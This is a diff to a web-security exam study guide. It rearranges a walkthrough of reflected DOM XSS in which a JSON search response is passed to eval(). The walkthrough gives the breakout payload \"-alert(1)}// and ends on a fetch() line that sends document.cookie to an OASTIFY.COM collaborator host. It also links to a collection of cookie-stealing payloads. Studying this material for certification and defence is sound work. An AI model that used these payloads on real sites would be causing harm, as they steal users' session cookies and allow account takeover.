@@ -381,18 +381,20 @@ From the Site Map, open the `searchResults.js` file and notice that the JSON res
 >Testing `\"-alert(1)}//` payload we successfully escape the `eval()`. The attacker then craft an exploit phishing link to the victim with a [cookie stealing payload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md) hosted on exploit server.  
 >Above payload validate that the backslash **\\** is not sanitized, and the JSON data is then send to `eval()`.  Backslash is not escaped correctly and when the JSON response attempts to escape the opening double-quotes character, it adds a **second** backslash. The resulting double-backslash causes the escaping to be effectively **cancelled out**.
 
->This way, the payload `\"-alert(1)}//` is interpreted as:
-
-```JavaScript
-var searchResultsObj = {"results":[],"searchTerm":"\\"-alert(1)}//"}
-```
-> Character `"` is escaped with backslash and `eval()` function interprets the Javascript code `alert(1)` (the `-` character makes the evaluation possible)
-
 >For example, if we search for `\"-alert(1)}//`, the response is the following
 
  ![Eval js](images/eval_js.png)
 
- >As noticed, JSON response (second field) is escaped. As the entire string is passed to the `eval()` function, the `alert(1)` is interpreted. Alternatively, more complex payloads can be used:
+ >As noticed, JSON response (second field) is escaped. As the entire string is passed to the `eval()` function, the `alert(1)` is interpreted.
+
+>This way, the payload `\"-alert(1)}//` is injected in the JavaScript code like this:
+
+```JavaScript
+var searchResultsObj = {"results":[],"searchTerm":"\\"-alert(1)}//"}
+```
+> Character `"` is escaped with backslash and `eval()` function interprets the Javascript code `alert(1)` (the `-` character makes the evaluation possible).
+
+>Alternatively, more complex payloads can be used:
 
 ```JavaScript
 \"-fetch('https://OASTIFY.COM?reflects='+document.cookie)}//
